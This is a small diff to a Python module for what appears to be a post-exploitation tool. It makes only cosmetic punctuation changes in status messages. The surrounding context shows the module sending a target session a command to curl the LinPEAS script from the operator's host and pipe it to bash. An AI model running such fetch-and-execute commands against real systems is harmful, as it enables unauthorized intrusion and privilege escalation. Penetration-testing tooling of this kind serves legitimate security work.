@@ -34,7 +34,7 @@ class LinpeasModule(ReaperModule):
                 self.err(f"Failed to download LinPEAS: {exc}")
                 return
 
-        self.notify("info", f"Got {len(script)} bytes – uploading to target…")
+        self.notify("info", f"Got {len(script)} bytes - uploading to target…")
         local_ip = get_local_ip(self.session.addr[0])
 
         with self.spinner("Sending linpeas.sh…"):
@@ -43,7 +43,7 @@ class LinpeasModule(ReaperModule):
                 f"curl -s http://{local_ip}:{port} | bash\n".encode()
             )
 
-        self.notify("info", "LinPEAS running – output below:")
+        self.notify("info", "LinPEAS running - output below:")
         self.breaker()
 
         output_lines = []
